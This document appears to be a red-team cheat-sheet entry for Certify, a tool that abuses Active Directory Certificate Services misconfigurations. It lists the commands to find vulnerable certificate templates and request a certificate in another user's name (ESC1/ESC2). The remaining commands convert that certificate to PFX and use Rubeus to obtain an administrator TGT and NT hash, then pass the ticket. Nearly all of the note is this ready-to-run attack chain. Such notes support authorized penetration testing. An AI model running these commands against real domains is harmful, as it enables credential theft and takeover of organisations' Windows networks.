---
tags:
  - tool
  - active_directory
---
# Certify

[Certify](https://github.com/GhostPack/Certify) is a C# tool to enumerate and abuse misconfigurations in Active Directory Certificate Services (AD CS).

## Enumeration

```powershell
# Find vulnerable templates
.\Certify.exe find /vulnerable
```

## Abuse

### ESC1 & ESC2

```powershell
# Request template with alternate SAN
.\Certify.exe request /ca:$FQDN\$CA /template:$TEMPLATE /altname:$TARGET_USER@$DOMAIN

# Convert certificate from pem to pfx format
& "C:\Program Files\OpenSSL-Win64\bin\openssl.exe" pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx

# Get TGT and NT hash for user from certificate
.\Rubeus.exe asktgt /user:administrator /certificate:cert.pfx /getcredentials /nowrap

# Sacrificial session
.\Rubeus.exe createnetonly /program:powershell.exe /show
.\Rubeus.exe ptt /ticket:$TICKET_BLOB
```
